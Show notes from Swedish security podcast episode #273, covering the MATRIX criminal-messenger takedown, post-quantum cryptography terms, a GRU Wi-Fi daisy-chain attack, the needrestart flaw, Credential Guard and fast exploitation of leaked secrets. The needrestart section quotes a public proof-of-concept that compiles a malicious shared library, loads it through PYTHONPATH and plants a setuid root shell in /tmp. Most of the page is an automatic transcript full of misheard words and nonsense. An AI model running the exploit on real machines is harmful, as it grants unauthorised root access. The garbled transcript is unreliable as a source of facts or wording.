---
date: '2024-12-09T19:16:00'
tags:
- ostrukturerat
title: "S\xE4kerhetspodcasten #273 - Ostrukturerat V.50"
---
## Lyssna
* [mp3](https://traffic.libsyn.com/secure/sakerhetspodcasten/2024-12-04_Sakerhetspodcasten.mp3?dest-id=117848), längd: 35:05

## Panelen

Johan, Mattias, Peter och Rickard tar sig vad som har hänt det senaste!

Jesper är frånvarande pga. att han är bad ass säkerhetspresentatör i Stockholm!

## Ämnen

* Europol slår till mot MATRIX
  * Off-topic: Säkra meddelandeprotokoll och kvantar
  * Off-topic: kvantkrypto-coinet
* WiFi hoppandes spioner
* Needsrestart
* Credential Guard
* Credential leaks hackas jättesnabbt

## Europol slår till mot MATRIX

Ett ganska stort kriminelt nätverk blev avkrypterat av Europol i månader, och sen nerstängt.
* MATRIX även ökänt som: Mactrix, Totalsec, X-quantum, Q-safe.
* **Observera**: _Ingen koppling_ till den decentralizerade meddelande appen `matrix.org`

Länkar:
* [matrix.org: An unrelated cybercriminal network named MATRIX was taken down](https://matrix.org/blog/2024/12/unrelated-cybercriminal-network-taken-down/)
* [thehackernews: Europol Dismantles Criminal Messaging Service MATRIX in Major Global Takedown](https://thehackernews.com/2024/12/europol-dismantles-criminal-messaging.html)
* [Europol: International operation takes down another encrypted messaging service used by criminals](https://www.europol.europa.eu/media-press/newsroom/news/international-operation-takes-down-another-encrypted-messaging-service-used-criminals) -
  _It is not the first time and will not be the last time that authorities are able to read criminals’ messages in real time_

> Authorities are staying on top of the encrypted messaging services that criminals use to undertake their activities.
> A joint investigation team (JIT) involving French and Dutch authorities has taken down another sophisticated encrypted messaging service, MATRIX.
> For three months, authorities were able to monitor the messages from possible criminals, which will now be used to support other investigations.
> During a coordinated operation supported by Eurojust and Europol, the messaging service was taken down by Dutch and French authorities and
> follow-up actions were executed by their Italian, Lithuanian and Spanish counterparts.

## Off-topic: Säkra meddelandeprotokoll och kvantar

Vad beyder alla djäkla ord:

* `Post Quantum Crypto`: "Kvantsäkert".
  Skall kunna stå emot att
  `AES-256` och en massa nya hipster hashar, handskakningar.
* `Forward Secrecy`: "Frammåtsäkert", typ Diffie Hellman, ECDHE-aktigt.
* `Rekeying`: "Bakåtsäkert" (Backward Secrecy?).
  Kasta bort gamla nycklar, om du tillfälligt är hackad skall du självläka.
  Det vill säga, givet vissa antaganden, kan du kanske lyckas överge en röjd nyckel eller en nyckel som skall röjas.
* `Quantum entanglement`: entanglade kvantar.
  Principen om att magiskt få två partiklar A och B att hänga ihop.
  I en extremt teoretiskt science fiction modell kan man kommunicera via sina kvantar.
  En app i en mobiltelefon kan absolut inte hålla i en entanglad app och kommunicera med en annan app via den ;)
* `Key signing party`
  - att mötas för säker betrodd `enrollment` / `key exchange`.
  - undvik att kalla det `key party` eftersom...
    ej att förväxlas med en festlig aktivitet mellan vuxna partner
    som utövas under samtycke och involverar andra nycklar
    (så mycket dumt man kan lära sig om man googlar...)
* `Web of Trust`
  - en typ av `Public Key Infrastructure (PKI)` där alla medlemmar i systemet kan signera/validera nycklar.
  - tillförlitligheten av en nyckel beräknas ut på ett smart och mycket förvirrande system.
  - typ hur bra som helst men vi vanligt folk är lite för dumma för att använda det i praktiken, verkar det som.

Länkar:
* [Apple: iMessage with PQ3 - The new state of the art in quantum-secure messaging at scale](https://security.apple.com/blog/imessage-pq3/)
* [Signal: Technical information](https://signal.org/docs/) - _Specifications and software libraries for developers_
* [Wikipedia: Signal Protocol](https://en.wikipedia.org/wiki/Signal_Protocol)
* [Wikipedia: Key signing party](https://en.wikipedia.org/wiki/Key_signing_party)
* [Wikipedia: Web of trust](https://en.wikipedia.org/wiki/Web_of_trust)
* [Wikipedia: Quantum entanglement](https://en.wikipedia.org/wiki/Quantum_entanglement)

## Off-topic: kvantkrypto-coinet

Kollade in Quantum1Net (`Q1S`) coinet vi nämnde igen lite kort...

* Sajter som försöker mäta trading visar inget på Q1S?
* Dött: Quantum1Net sajten finns inte mer. Whitepaper m.m. finns inte längre.
* Dött: Quantum1Net (Q1S) bounty-trådar på bitcon forum verkar ta slut i 2018.
* Dött: Länkar till youtube videos olistade, så svårt att veta vad de visade.
* Facebook: 2018 sista postningarna om `Q1S`?
  Blandade postningar något år efter det, verkade inte uppenbart handla om `Q1S`.
* ICOARM: för Q1S förvirrar oss coin-noobs;
  - Roadmap: Alla målen skall vara implementerade?
  - Fundingen är både 0% och 100% samtidigt?! `Planned funds: $4,284,840.00`, `Current status: 0% done`, `Cercentage of completion 100%`
* Github närvaron verkar handla om `Q1N` inte `Q1S` och strukturen är underlig, inte så man brukar använda git.
  - Används inte för källkodshantering.
  - Varje huvudrelease har en eget git-repo?
  - Varje minor-rlease har en zip-fil?
  - Github funktionen för releaser används inte.

Länkar:
* [Säkerhetspodcasten avs.120 - Om kvantumkalabalik med Jonathan Jogenfors](https://sakerhetspodcasten.se/posts/sakerhetspodcasten-avs-120-om-kvantumkalabalik-med-jonathan-jogenfors/)
> I dagens avsnitt intervjuas Jonathan Jogenfors om kvantkryptering, kvantdatorsäker kryptering
> (“PQC” Post Quatum Cryptography) och hans twitter-bråk med Quantum1Net.
> I början av podcasten nämner vi synpunkter som vi har fått ta del av från Quantum1Net.
* [ICOARM: quantum1nen Q1S](https://icoarm.com/ico/quantum1net/)
* [Facebook: quantum1net](https://www.facebook.com/quantum1net)
* [github.com/quantum1net](https://github.com/quantum1net)

## WiFi hoppandes spioner

Ryska spioner påstås hoppa via olika grannars nät för att komma inom räckvidd för WiFi-hacking av mål.

Länkar:
* [Wired: Russian Spies Jumped From One Network to Another Via Wi-Fi in an Unprecedented Hack](https://www.wired.com/story/russia-gru-apt28-wifi-daisy-chain-breach/)

## Needsrestart

Ubuntu varit helt osäkert i 10 år!

`needsrestart` hade lätt att missbruka local privligie eskalering från `user` till `root`.

Root äter `PYTHONPATH` från user processer och kör user-processernas `constructor`...

Lite pinsamt fel?

* [Qualys Security Advisory: LPEs in needrestart (CVE-2024-48990, CVE-2024-48991, CVE-2024-48992, CVE-2024-10224, and CVE-2024-11003)](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
* [Low Level: this vulnerability has been hiding for 10 years.](https://www.youtube.com/watch?v=CDtIS8XaJDY) - `video`
* [Brodie Robertson: Ubuntu's Decade Long Privilege Escalation Bug](https://www.youtube.com/watch?v=0OXcJ5uAdQg) - `video`
* [github.com/liske/needrestart](https://github.com/liske/needrestart)
* [github.com/makuga01/CVE-2024-48990-PoC](https://github.com/makuga01/CVE-2024-48990-PoC)

``` bash
# makuga01/CVE-2024-48990-PoC/start.sh
gcc -shared -fPIC -o "$PWD/importlib/__init__.so" lib.c
PYTHONPATH="$PWD" python3 e.py
```

``` c
// makuga01/CVE-2024-48990-PoC/lib.c
static void a() __attribute__((constructor));
void a() {
 setuid(0);
 setgid(0);
 const char *shell = "cp /bin/sh /tmp/poc; chmod u+s /tmp/poc &";
 system(shell);
}
```


## Credential Guard

* [SANS ICS: Credential Guard and Kerberos delegation](https://isc.sans.edu/diary/Credential%20Guard%20and%20Kerberos%20delegation/31488)

> Credential Guard completely blocks Kerberos Unconstrained delegation,
> which effectively blocks us from extracting the TGT (and will break
> any application that relies on this feature as well!).

> Credential Guard also blocks NTLMv1 completely

* [Microsoft: Credential Guard overview](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
* [Microsoft Mechanics: Token theft protection with Microsoft Entra, Intune, Defender XDR & Windows](https://www.youtube.com/watch?v=gPcNlm0CyOw) - `video`

## Credential leaks hackas jättesnabbt

Clutch security testade hur snabbt läckta creds exploiteras:
* Under 1 minut: **AWS nycklar**
* 1 minut: **Github Personal Access Token (PAT)**
* 4 minuter: **Okta API Token**
* 5 minuter: **Stripe API key**, **RDS Credentials**

Uppenbart har angriparna bottar och är vansinnigt mycket snabbare än ett devops/devsecops team efter att de gjort bort sig.

Deras tes är att "Secret Rotation är en illusion" baserat på hur mycket snabbare angriparna är.

Men, man kan i vart fall vara glad att det finns goda skälar där ute:

> One particularly sobering moment was when a Reddit user commented on a post we created:
> “Hey, I think you accidentally shared some sensitive keys here.”
> It was a polite nudge but highlighted just how publicly visible
> these mistakes can be—and how easily they can be overlooked.

Ett potentiellt riktigt bra argument för secrets scanning i pre-commit hooks.
Vi länkar också till `Theo-t3.gg` video om varför pre-commit hooks ofta är dåligt/impopulärt.

`TL;DR`: se till till att dina pre-commits hook är blixtsnabba, och ha även kollen i CI/CD.

Länkar:
* [Clutch: The Day We Unveiled the Secret Rotation Illusion](https://www.clutch.security/blog/the-day-we-unveiled-the-secret-rotation-illusion)
* [Theo - t3․gg: The dangers of precommit hooks](https://www.youtube.com/watch?v=LL01pLjcR5s) - `video`

## Galen AI transkribering

### 1 00:00:00,000 --> 00:00:29,000
Hej och välkommen till säkerhetsbokosten jag som pratar lite Johan Rydberg Möller med mig Har jag Peter Magnusson se till din ab-testning och sydraget och trycka på först Ja fortfarande Ja Jesper inte här han är i Stockholm och gör något dumt roligt eh vi ska nämna att det är fjärde december när vi spelade in detta Och vi Ja precis snart eh vi sponsrade av några

### 2 00:00:31,400 --> 00:01:31,200
och andra viktiga nyheter ska vi också prata med den här avsnittet men innan dess så ska vi nämna Sword som vist persons allting som finns på bordet.se och nolly Sera som finns på 0x4 a.se Vi finns på saker jag språkcaster.se och där finns också alla Show notes som är värdelösning nu för tiden alltså i den svenska begärde av Google eller någonting Ja men sen kolla in på svenska meringen av den senaste den är guld och där finns alla länkar och sånt om vi pratar om grejer det är bra eh vad mer såg utfäst CP skicka in till vad det är för plaggs det är två sorteret avsnittet för över till så att eh secretfest Nej men de kommer komma i precis i början av nästa år tror jag planerna typ januari Irish Oj Det låter nästan ni blir proffsiga på det här eller hur dags att börja sälja Nu är det så att du är redo när

### 3 00:01:31,400 --> 00:01:51,200
när ni kommer Nej jag tror att där är Fan kommer januari februari där släpper vi Jag vet inte exakt om någon månad någon gång i q:et typ hoppningshus då kommer de Men innan dess så ska vi gräva ner oss lite säkerhetsnyheter och vi kan väl ta och börja med tur in i The Matrix

### 4 00:01:53,400 --> 00:02:47,700
Ja det här är ju en höll jag på att säga det känns som vi har hört den förr eh Om man tänker på enkel och chatt och de här handlar inte om Keanu Reeves utan om checka telefoner som kopplar upp sig i ett nätverk och pratar krypterat som eh brottslingar kanske köpa för dyra bitcoins var det så att de hittade en telefon Ja jag har inte den den Ja vad bra ehm faktiskt länge sen 2021 så var det en holländsk Dude som tänkte ta livet av journalist men jag kan inte riktigt Bakgrunden för det var en holländska artikel som inte jag för såg men de tog honom i alla fall utan att han hade dödat sina journalisten och de upptäckte att han hade telefon på sig och den telefonen hade en cool app i sig och där började storyn

### 5 00:02:49,100 --> 00:03:21,100
precis eh lite bakgrund då Det Det här är ju europol tillsammans med eh franska och holländska och litauiska och tyska eh polismyndigheter som har då Gått efter den här och de säger att eh systemet var väsentligt mer komplext än eh de här typ enkel och chatten de här Ja precis men det är 40 servrar uppsätta runt omkring värde men jag tror de väsentligen var de i Frankrike och Tyskland Det var den största massan var

### 6 00:03:22,400 --> 00:04:22,300
i hur svårt är det att bygga sådana här egentligen Story av Systemet hela tiden glömma av vad det ska vara ordningar och ingen ska komma ihåg någonting missade du måste ju ha videokatt och du måste ha alla coola grejer men men jag tänker så här Alltså som jag sa lite innan vid då igång här liksom hur jävla korkade är brottslingarna liksom varför varför liksom Ja men hoppa på de här Jag vet Vi har en specialverktyg här för brottslingar bara gissa om polisen kommer inrikta sin span mot den här han inte någon tidigare där liksom polisen själva eller om man ser här i sin egen köttgrunken det är det ingen som är en bok om det det har ju förekommit några gånger att man har Eh det var ju någon historia som typ missar till förra avsnittet eller någonting då Det var nog ondningar att man använt mullvad det är också

### 7 00:04:22,300 --> 00:04:39,400
när ordningarna som använt signal och sånt och det är ju lite jobbigt när vi vill inte att badgar snuddar våra grejer för då ökar ju risken att myndigheterna gör något järn det liksom så det är ju väldigt snällt av brottslingan att ha sina egna kriminella nätverk det Det är jättebra

### 8 00:04:47,400 --> 00:05:47,400
så kanske vi kan få våra mest galna politiker att låta bli våra grejer ja precis ehm tänker ofta children är det som var coolt med den här var som sagt Ja det var ju byggde ju ganska surfestera som de sa med massa med servrar runtomkring i världen den var dessutom uttryckligen en trending cryptoide eh så det räcker ju inte att gå servicide bara så de har ju hittat en flå antagligen i protokollet på något sätt och det kan vi också säga Matrix är ju även ett ett kommunikationspratikal för eh låt kalla det Eh en öppen spesad eh social media messaging grej ah det är inte samma men typ så ett org är det inte Vi pratar om för att göra det ännu tydligare så den här appen Det är bara ett av deras namn dens namn som är Matrix den är även kallad för Eh maktricks alltså samma fast med ett c total SEK X quantum och q safe men nu

### 9 00:05:47,400 --> 00:06:46,200
så att det är svårt att få de vassaste krypten människa när man tar men de här grejerna i Tång det Det måste ju vara nu måste vi vara så här liksom Okej du får någon någon it kunnig och jobba på det men men de bästa verkar ju inte vilja ägna sig att bygga kriminella nätverksamen eh i mindre risk eh fokuserade jobbet kanske som du sade killar det finns ju enklare sätt för kriminella kommer ner kommunicera kryptera som inte har de här riska vad fan PGP men det är sagt Det var ju inte så att det är ju inte hela världen som använt den här utan de vi tillfälligt när de när de tog dem nu då För nu har de ju typ nedlagda då så här så fanns det 8000 konton Jag gissar på att det finns fler kriminella i Europa än så förmodligen Ja men de har fan använt de här Jag gjorde lite snabbt de har nämligen under tre månaders tid så har då europol I den här joint International Task Force eller vad heter det operation

### 10 00:06:47,300 --> 00:07:47,100
Sanna passionflower heter det i tre månader så har han då Eh lyckats stickeruptera meddelanden och på de tre månaderna så de rekryterat 2,3 miljoner meddelanden och lite snabb matte då om Vi slår ut det på eh 90 dagar 8000 hamburgare så har de i snitt skickat 30s per person så de är fan aktiva ut så är det Ja det kanske är det så att man undrar om det här var nu jag vet inte det Men var är lite så här sociala medier för bovar kunde man hitta varandra på den tiden Jag tror det var Fokus jag fattar om jag fattar hela efter det ska vi se Det var Det var det nån sån Eh inte Point alltså Business to Business snarare än till slutkund då Ja herregud Ja herregud ja eh Om du inte var en stor kund då kanske Ja jo en trending cryption exclusive Access Men eh och när man knäckt hela

### 11 00:07:47,200 --> 00:08:40,900
men så var det väl inte så jävla mycket ändå än i slutändan var väl att det skulle vara en kväll och då gjorde även eh när du loggar på jag fattade som att det var för första gången så fick du då ett meddelande som typ välkommen eh och det här Välkommen till mellan sa att för fan har du nu har du valt en säkertjänst Vi vi har sagt till Sky chat och enkel och chattar om det att de har liksom mycket sårbarheter men vi vi har haft business i åtta år utan sårbarheter så de hade högst ansvaring och de tog betalt för det här då Eh du kunde köpa ett ett kit då nånstans runt 15.000 spänn Fick du casha upp för en Google Pixel som var då preppad med den här appen och sex månader subscriptionen ingick med det sen var det sen börjar det kosta per månad utöver det Det vet jag inte men bara Det är då 8000 konton 15.000 spänn per konto det är 120 Milla så att det det men alltså ser man skulle vilja bygga en en Eh nu behöver ni inte vara en Crime men en app som skulle ha en snorlacka utbild

### 12 00:08:41,500 --> 00:09:03,800
eh och Vi skiter i USA billigt ju men den första hade ju varit eh de får para sig optiskt ställen åt liknande de är nära varandra så att eh du kräver vi via Vi använder ett så kräver och att det är nyckeln utbytet sker och eh sker säkert vi kopplar bort hela den här ljus ability grejer Om jag inte kan messar om du inte har känt till tidigare

### 13 00:09:04,800 --> 00:09:14,000
bovarna alltid ja kanske säga att hon träffar du parar telefonen och sen kan du dela ut en telefon

### 14 00:09:41,800 --> 00:10:18,700
här ännu roligare så eh har ju då Euro pool faktiskt eh skoja till det De har ju satt upp en täckt av notice då Eh och eh går du till den här sajten och tittar eh så så står det nu så så de alltså kört en Matrix animering och så kommer du vet så här aski terminaltecken proppas animera samma mer nu igen som säger liksom att nu har vi knäckt den här sajten Vi har alla alla lösenord eller alla hemliga meddelanden hjälper liksom inte om det går till någon annan natt i kommentarer igen

### 15 00:10:19,400 --> 00:10:23,700
men det är ju sjukt spännande vi har de här problem men när både Google och eh

### 16 00:10:25,300 --> 00:11:25,200
vad heter de äppel pepels grunkiga De har sina Ford Secret ser och sina backward Secret ser hela kitet och så och så kommer de här då som antar inte alltså ett mål folk som har en extrem hotbild och fuckar upp eh liksom själva idén men det är ju för att de inte kan kryp då äpplet en till crimewear.com Jag tror de har lyssnat på vårt andra eh avsnitt eh och inse att monokultur är inte bra Så att de inte köra sin egen då är det problemet att de har samma på samma protokollt Vad använder honom bara hade de bara Johan hade sin Crime a-app och gör det min Crime b-app och de och fyra då hade vi inte haft många kultur och sen hade vi inte rekommenderat men ni ser att de säger de hade ju då mate tricks makrix totalsex quantum q Safety

### 17 00:11:25,300 --> 00:11:44,700
kanske var olika Mm Mm får ha en Kvant där Och så har jag en kontinent med att min app bara vi löser vi det så jag tror att vi behöver köra färg på kriminella

### 18 00:11:45,100 --> 00:12:07,500
hahaha Du menar att min Kvant kommeritation och andra Youtuber Hojta om du löser det så för då ville jag investera med oss kvantkrypte och grunken som vi pratade om tidigt Och det var någon som blev så arg på oss för att vi hade sagt negativt utav den här laserna

### 19 00:12:09,600 --> 00:13:04,600
Hur många år sen har det gått det är det fem år sen Det Det var inte Ja det finns folkhält nya såna märkliga rapporter om Kvantum safe eh i networking och sånt våran denna vecka tycker jag Jag tänkte på det så där med Quorn sneglar vi iväg på ett eh sidospår igen men men det här med med eh quantum safe cryptography liksom Och jag tror att flera av dem är ju visat sig så bara mot mot vanlig Krypt då analys eh utan de som har gått igenom miststävlingar nu va möjligen men ja under tiden Det gjorde du definitivt och jag tänker det här liksom med scaretactics liksom att Ja men nu måste man ha quantum safecriptography för att eh bara säker bara av först Hur eh motargumentär är ju att eh flera och implementerat hybrid

### 20 00:13:05,500 --> 00:14:05,100
så att du har både klassisk och quantumsöker säkerhet så och så mixar de med någon liten så att även om någon bryter dina kvantar så ska jag klassisk säkerhet fortfarande rädda dig och det är väl just därför att det är de här nya protokollerna men om de har gått igenom hela nice stävlingar och så vidare så är de ändå relativt nya o-testar där ja så därför så väljer folk och och köra en hybrida variant Jo Kim Strömberg som skrev väl en artikel just om att eh närmar oss snart datum för AIS kommer vara riktigt gammalt snart även om det fortfarande känns vakt nu så så är det Jag tror att jag var 20 fyllde 20 år härom veckan eller något här eh han eh pekar också på en artikel från Justice faktiskt om hur de tycker att transitionen ska gå till eh från klassisk crypto till kvantum-krypte då

### 21 00:14:05,500 --> 00:15:04,500
var för mig nu Det har inte jag läste en rapporten Men jag har för mig att de har hintat tidigare att de vill ju inte gå via hybridsteget de tycker det är extra arbete och extra komplexitet och så vidare Men tittar du på faktiska implementacioner idag som Apple har gjort till exempel Då kör ju de hybridget just bara för att de är lite nervösa för här så att Eh Men jag ska intressant att läsa den rapporten Det är ett så kallat tidspunkt Ja har vi nog säga Matrix det är coola telefoner och coola appar men inte så coolt att vara Boo gäller och ta telefonsamtalet innan bilen körde in i det vi kommer pusha för Peters Crime app när den är klar Eh Men då kan jag ta och vidare här för det är att du inte pratar lite om livet som rysk spion oj ja eller agent som man vill Så här i och för sig Det är ju som bekant jobbigt att vara geru agent ibland Okej närmare bestämt Är det jobbigt om man är det

### 22 00:15:05,400 --> 00:16:01,300
den är 2018 okej för då har man nämligen fått från Putin att ni måste ju hacka er in på organisation for the proibition of chemical weapons okej för då påverkar de lite Ja eller jag tror att de ville ha reda på information om Ukraina bland annat och sånt där eh du har ju framsynt Men eh det var ju bara det att fan vi måste ju brutas in här tänker man då så Vi sätter oss med våran stora jävla wifi-antenn i baksätet och så parkerar vi oss utanför kontoret i Nederländerna och då blev de blev Ja kan man säga de blev grytorna så det är small om det Jaha eh förbjudet att ha wifi antenner i baksätet och hacka chemical Warfare organisationer eh så det Det var en problembild då som ger U hade att det här med när det krävs krävs någon form av fysisk Access då måste man ofta vara fysiskt nära någonstans

### 23 00:16:02,900 --> 00:16:33,400
men det har de nu tagit sig runt så bra så att nu kan de sitta hemma i soffan i Moskva och hacka saker fysiskt på andra sidan jorden Astral projektion låter bra Det här är någonting som som släpptes på cyber warcon security conference eh här i veckan av Steven Adair från hans firma volexity

### 24 00:16:34,400 --> 00:17:22,500
de har nämligen stött på ett case där geru eller apte vad heter de nu då till 28 och så kändes som Fancy Bear lyckades göra en attack som de kallas för the nearest neighbor attack det var nämligen så att en onnämnd kund till och lexit idag Eh fick ett angrepp och de kunde inte lyfta ut Varifrån När angrepet kom när de insåg att det här men de hade tagit de har tagit sig in i våra system De har gjort det över WiFi men vi fattar inte riktigt var finns det några smittade Eh vad heter det smarta TV apparater eller andra grejer routrar någonting sådant de gör inte överallt och letar och kollade och fruktar er på vad fan det här kommer ifrån

### 25 00:17:23,300 --> 00:17:43,700
och gjorde massa förensiska analys och till slut så visar det sig att eh nätverket som hade anslutit till deras eller enheten som hade anslutet till deras nätverk den läckte Vilket domän den var ansluten till alltså typ ad och det är namnet känner de igen för det var ju företaget på andra sidan gatan

### 26 00:17:45,300 --> 00:18:38,300
och då visade det sig att eh gru hade helt enkelt hackat en laptop som stod på kontoret på andra sidan gatan den laptopen anslutet till en docka så det är en ansluten med ethernet och sen hade de använt den laptopens wifi kortet för att sedan attackera eh målet då som var på andra sidan gatan och förmodligen så var det ju inga avancerade attacker i det sista steget där utan där tror jag att det var någon form av kardemption som de redan hade fått män som eh krävde då fysiskt närvaro Wii wifi:et eh men det visade sig sen då när de kollade närmre på detta att förmodligen så är det så att de hade behövt hacka två eller två tre fyra olika devices på vägen för att hoppa fram tills de kom till en laptop som låg tillägg nära det Wifi nätverket som de vill vara på

### 27 00:18:39,400 --> 00:18:55,600
Annika soffa istället för att ta sig till platsen att det var ganska svårt att bli av med dem för de behöver inte bry sig ifall de upptäckta även om de var effektiva på att sopa igen spåren efter

### 28 00:18:56,700 --> 00:19:06,000
för jag menar då ska du göra Vem ska du gå och gripa Du får gå långt så att de var väldigt precisant eh sa han där

### 29 00:19:07,100 --> 00:19:41,000
och det är ju liksom Advanced but sister mot fönstrena som men nu behöver du ju ändå en fysisk närvaro och viktigt om man kommer ju bort från den här då i med att de hoppar via grannarna istället eh ryssar repot även om de inte ens är fysiskt Nej men bli så har vi löst en del av problematiken men vi sätter blir lite överallt och så blev det nyttigt du kan stänga av wifi Jag tänkte jag säga

### 30 00:19:45,100 --> 00:19:50,000
precis så att det var inget så kort nyhet men lite intressant än en ny typ av attack

### 31 00:19:52,900 --> 00:20:21,800
du kommer tillbaka Har du någon gång känt att det kanske vore gott att starta om datorn de Fixar du ett program som berättar för dig om du borde starta om datorn och eh den gör ju det på en annan basis eller bara liksom så här

### 32 00:20:23,100 --> 00:20:23,400
eh

### 33 00:20:24,200 --> 00:20:33,200
man kunde ju ha en så här att man bara säger till att du både starta om datorn om det är en torsdag eller så men den gör det istället bara säga bara att du kör uppdateringar

### 34 00:20:34,300 --> 00:21:08,800
och så finns det program som heter nitreatstart Jag tror nästan bara i bunte som körde här men buntar ganska många användare Det är i alla fall många ubuntinspirerade distros och sånt som körde introdudestart och var den gör är att den skannar alla pågående processer så den körs i med rot och är lite gud på min köns så scannar den alla processer som är igång och så berättar den om processerna har någon mjukvara som är eh så många man sårbar version av någonting

### 35 00:21:09,800 --> 00:21:23,000
Vad finns det någonting som kör som i svarbart så rekommenderar när man botar om datorn Du kan ju också försöka starta om exakt om grejerna som behövs men men Ofta du enklare bara starta om datorn

### 36 00:21:25,900 --> 00:21:27,900
men var det jag sa om man kan säga att

### 37 00:21:29,100 --> 00:21:35,900
för att göra vad mindre restarts görs Vad Vad är det egentligen man behöver alltså

### 38 00:21:36,900 --> 00:21:40,200
som rot på något sätt få veta vad

### 39 00:21:41,700 --> 00:21:46,200
vad klienterna

### 40 00:21:47,900 --> 00:22:47,900
konstigt ljud här och Mattias gör miner Vilket är helt men som rot men vi får veta vad Josef Space kör för mjukvara och det implementerade man helt trasigt på något sätt så att man scanner igenom här alltså läst man in Jag kommer inte ihåg om det var någon variabel eller någonting där och så lyckades man får helt eh sårbart så att man ljus i Space kunde bestämma vad vilken kod som skulle exekvera i rotspray så det är inte så lyckat med typiskt dåligt eh och sen så det fanns en brutal fel Design i Nils ridstart och den designen har legat där i över 10 år innan någon har hittat den här så jag behöver inte baserade maskiner har vem som helst kunnat däver med relativt enkel relativt straight forward eh Suede till Pol

### 41 00:22:47,900 --> 00:23:23,000
Ja tack så bara lägga där ute tydligen till den har du varit enkelt att bli roligt när man var cool Linux ljusare och inte vill använda Windows har ju så supertöntigt för man vill starta om så Fortfarande sin uppdatering men alltså i Linus så var det bara update så var det klart liksom Och nu finns det alltså då ett ett program som typ nästan gör Windows emulgering supertöntigt och tillför en snygg privas

### 42 00:23:30,500 --> 00:23:49,300
om du är höger upp i alla liksom Högt uppe i värdekedjan så borde du bara kunna bota om eller döda alla processor som så där Men det är väl förmodligen det är att man vill vara lite snäll och att allting inte hänger ihop det sen med sitt det är ju miljontals olika utvecklare som har flöjt upp Linux

### 43 00:23:50,600 --> 00:23:59,200
Tror du att Alright Ja vi byter till mjölk

### 44 00:24:00,000 --> 00:24:28,300
Eh det var några pen tester som tror det var för Sands när man har skrivit en så som de gjorde ett Penta hästar som körde de sina coola Windows Hacke grejer som alltid funkar och helt plötsligt Funkar de inte och de så här Wow vad har hänt någonting ute i den stora världen eh och vad som har hänt är att i

### 45 00:24:29,500 --> 00:24:45,600
eh Windows server 2025 och i någon variant av Windows 11 så har man rätt slå på dels studential Guard men också Någon option om att man vill ha

### 46 00:24:46,900 --> 00:24:52,700
vad heter det typ credential eller devices binding eller någonting heter det Eh

### 47 00:24:55,100 --> 00:24:59,300
Vilket alltså innebär dels att du flyttar

### 48 00:25:00,600 --> 00:25:20,800
så att istället för att du lägger dina alla dina krydds och samtid en klassisk windowsinstallation som ligger de i Windows operativsystemet Eh Men kryddion Guard så skickar du dem till en liten säker äpplet eller container eller om man kallar det som ligger och köp brevid Windows man använder de här

### 49 00:25:22,000 --> 00:25:56,100
leta VSM man kör lite som gör grejer Alltså Sen ligger utanför operativsystemet tpm eller något sånt där ja typ mjukt tpm via hypervisor i stuff så det är den ena att Eh det är inte så jättelätt att be om window och så tappa bort sina Kardashian som det har varit historisk sett eftersom att Windows helt enkelt inte har dem eh Och det andra är att de har gjort någon liten ändring så att eh

### 50 00:25:58,800 --> 00:26:35,400
de här tokorna de lämna maskinen så är det mer bundna till maskiner än varit i storutsätt så att du kan eh säga att Jesper snor min tok än så har du alltid varit så att de så fort jag av med min tokig och vi kan gäspe direkt använda den men nu så är min tok en mer bunden till min device så att de Jesper börjar använda den från sidan om så ska eh supportera En systemupptäcka att när du har inte Nej du har inte rätt då med den här eh så det är en ny cool feature som finns med senare versioner av Windows som

### 51 00:26:36,400 --> 00:26:37,800
hur använder

### 52 00:26:39,700 --> 00:26:49,900
jag tänker Antingen så måste det vara typ signerat med en privat nyckel som bara finns i den devicen eller så att någon unikt i det som är på något sätt kopplat till klockan

### 53 00:26:51,700 --> 00:27:25,600
Men eh någon farm form av krypten kryptografisk koppling måste ju byggas till din enhet så att Eh det finns ju i nu nu kallar det verkligen inte Windows alltså det är väl någon variant på karber och så eh och jag kan verkligen inte det för att kolla på superlog nivå men men det finns ju i andra system som finns för att du

### 54 00:27:26,800 --> 00:28:04,900
hårdkördare Token Alltså om du tänker dig jv10 och sånt så finns det ju fält för kåda att givet igen bunden till en viss eh till en viss mottagare och då kan också binda att eh Token heter hårt bundet till en risk klient och sen signaturen får det så att Eh den i hårt kopplad och sen inte kan användas på något annat sätt och du bygger upp det med TLS och grejer runt och då antar jag att den här devices bandingen på Windows gör något snarlig men på mycket lägre nivå på karburos då och

### 55 00:28:06,100 --> 00:28:53,900
det är så bra att vi är dels har en artikel och sen har vi en video från microsoften de pratar om hur bra det och det kommer ju aldrig finnas inte alla detaljer för jag inte någon som helst minne om att ha Eh det är möjligt att i detaljerna i sans artikeln att det förklarat bättre men kan säga den micros har uppdragningen som jag lyssnade på så gick de verkligen inte ner på dentalgraden som du efterfrågade Eh Men vi antar att det hyfsat välgjort tills motsatsen får du kära lyssna jättegärna göra en säkerhet Han har totalt knäcka det här och sen kan du be oss vara med på en Skop om hur ser vi en på hur trasigt här är så att kan vi vara nästan först ut mellan när du släpper den nyheten rimligt

### 56 00:28:55,500 --> 00:29:26,400
coolt prevention lik då Eh jag hittade en artikel om att det tesen jag kortade ner tesen till att Secret rotation suger eh de eh förde tesen att vi har förlitat oss på att det är okej att vi är så kassat montera hemligheter för att vi vi kan rotera dem när allting har gått åt skogen

### 57 00:29:28,800 --> 00:29:29,300
och

### 58 00:29:31,000 --> 00:29:44,500
då föredrar om testen att normalt sätt tiden för dig från det att du tappar bort din sikret till det att Secret Den är roterad det brukar vara relativt lång tid

### 59 00:29:45,200 --> 00:30:43,700
så då körde de med han med potte övning istället att de satte upp lite olika Secret som lite olika typer eh kopplade till olika grejer och sen börjar de helt enkelt mäta på de Känslan när han kommer första inloggningen och sen började de läcka då relaterade hemligheter i olika kanaler och den snabbaste liksom hackningen då eller man Nu verkar hackningen den första exploiteringen av att du har tappat bort en hemligheter den inträffar alltså minuter efter att du har gjort bort dig eh Vilket typ är snabbare än vad det tar för utvecklarna och märka att de har ju bort sig Eh alltså inloggningen till S3 backs inlagningar till Ja de klassiska ställen Där du brukar läcka den typ de råkade ja råkade med de kunde pusha dig till något glitter är på något annat

### 60 00:30:45,300 --> 00:31:00,600
så tydligen åtminstone du är mål av något sorts intresse Då ligger det folk som är duktiga där och i och möte handlade om minuter så måste det ju nästan vara bortstött liksom För att veta

### 61 00:31:02,400 --> 00:31:09,600
så det Det sitter Team där ute som tydligen är jävligt skärp där på svårare hemlighetstyper vet du det

### 62 00:31:12,000 --> 00:31:36,400
